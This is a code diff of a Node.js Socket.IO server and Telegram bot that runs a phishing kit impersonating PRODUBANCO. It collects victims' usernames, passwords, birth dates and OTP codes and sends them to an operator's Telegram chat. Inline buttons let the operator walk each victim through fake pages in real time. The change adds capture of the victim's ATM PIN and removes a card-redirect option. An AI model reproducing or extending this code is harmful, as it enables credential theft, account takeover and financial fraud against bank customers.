@@ -27,17 +27,16 @@ io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
   // Login principal
-  socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
+  socket.on('dataForm', ({ usuario, contrasena, claveCajero, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
+    const mensaje = `🔐 Nuevo intento de acceso PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
             { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
-            { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+            { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` }
           ]
         ]
       }
@@ -46,7 +45,7 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Código OTP (bienvenido.html) - AHORA SOLO UNO
+  // Código OTP (bienvenido.html) - SOLO UNO
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -56,8 +55,7 @@ io.on('connection', (socket) => {
         inline_keyboard: [
           [
             { text: '❌ Error de código', callback_data: `error_${sessionId}` },
-            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
           ]
         ]
       }
@@ -66,7 +64,7 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // OTP reintento (denegado.html) - TAMBIÉN SOLO UNO
+  // OTP reintento (denegado.html) - SOLO UNO
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -76,8 +74,7 @@ io.on('connection', (socket) => {
         inline_keyboard: [
           [
             { text: '✅ Finalizar', callback_data: `otpFinalizar_${sessionId}` },
-            { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+            { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` }
           ]
         ]
       }
@@ -87,17 +84,16 @@ io.on('connection', (socket) => {
   });
 
   // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
+  socket.on('errorlogoForm', ({ usuario, contrasena, claveCajero, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
             { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
-            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` }
           ]
         ]
       }
@@ -116,8 +112,7 @@ io.on('connection', (socket) => {
         inline_keyboard: [
           [
             { text: '❌ Error TC', callback_data: `errortc_${sessionId}` },
-            { text: '✅ Finalizar', callback_data: `finalizarTarjeta_${sessionId}` },
-            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
+            { text: '✅ Finalizar', callback_data: `finalizarTarjeta_${sessionId}` }
           ]
         ]
       }
@@ -180,7 +175,7 @@ bot.on('callback_query', (query) => {
     bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
   }
 
-  else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_') || data.startsWith('tc_')) {
+  else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_')) {
     const action = data.split('_')[0];
 
     if (action === 'errortc') {
@@ -189,9 +184,6 @@ bot.on('callback_query', (query) => {
     } else if (action === 'finalizarTarjeta') {
       socket.emit('redirigir', 'https://www.google.com/');
       bot.sendMessage(chatId, '✅ Finalizando...');
-    } else if (action === 'tc') {
-      socket.emit('redirigir', 'card.html');
-      bot.sendMessage(chatId, '🟨 Redirigiendo a TC...');
     }
   }
 
